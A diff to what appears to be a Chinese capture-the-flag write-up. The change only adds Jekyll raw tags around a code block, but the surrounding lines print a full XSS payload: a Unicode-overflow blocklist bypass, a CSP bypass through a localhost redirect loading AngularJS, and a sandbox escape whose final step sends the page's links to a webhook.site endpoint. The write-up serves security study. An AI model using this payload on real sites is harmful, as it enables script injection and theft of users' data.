@@ -44,6 +44,7 @@
 根据`bot.ts`来盗取`flag`  
 ![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110001119.png)
 payload  
+{% raw %}  
 ```javascript  
 氼script src=&#34;http://localhost:3000/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&#34; 夾  //氼/script 夾  
 &lt;div data-ng-app&gt;{{&#39;a&#39;.constructor.prototype.charAt=[].join;$eval(&#39;x=1} } };  
@@ -53,6 +54,7 @@ payload
     const encodedLinks = btoa(unescape(encodeURIComponent(JSON.stringify(links))));  
     return fetch(&#34;https://webhook.site/5b154691-3fdb-46b8-980b-735e19b081f2?ans=&#34; &#43; encodedLinks, { method: &#34;GET&#34;, mode: &#34;no-cors&#34; })});//&#39;);}}&lt;/div&gt;  
 ```  
+{% endraw %}  
 ![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502110004738.png)
 ## Reference  
 [https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows](https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows &#34;https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows&#34;)https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects  
